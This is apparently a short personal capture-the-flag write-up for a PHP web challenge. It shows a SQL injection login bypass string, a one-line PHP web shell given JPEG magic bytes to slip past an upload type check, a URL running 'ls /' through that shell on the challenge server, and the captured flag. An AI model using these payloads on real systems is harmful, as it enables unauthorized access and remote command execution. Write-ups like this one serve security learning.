---
ai_date: 2025-04-27 05:21:11
ai_summary: Login bypass via SQL injection, payload executed in upload via magic bytes manipulation
ai_tags:
  - sql
  - xss
  - magic.mime
created: 2024-08-03T22:15
tags:
  - php
  - mime
updated: 2025-07-14T09:46
---

## login

Login bypass with naïve SQL injection.

```
kumo' or '1'='1
```

## upload

Bypass hypothetical mime type check via magic bytes.

Referenced [magic.mime)](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime)

```
# JPEG images
0	beshort		0xffd8		image/jpeg
```

```bash
echo -e '\xff\xd8<?php system($_GET['cmd']); ?>' > payload.jpg.php
```

## exploit

[188.166.252.88:1810/upload/bd50ad821429b24a932ec1fa5bfc65c1/payload.png.php?cmd=ls /](http://188.166.252.88:1810/upload/bd50ad821429b24a932ec1fa5bfc65c1/payload.png.php?cmd=ls%20/)
![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1722738101/2024/08/c8e388ba9b17413494cbaa7025c7db4c.png)

```flag
MSEC{s0me_T1me_I_w1sh_I4m_aC@t_noW0rk_noDeAdl1ne_JustMe0oow}
```

Not sure where is P1.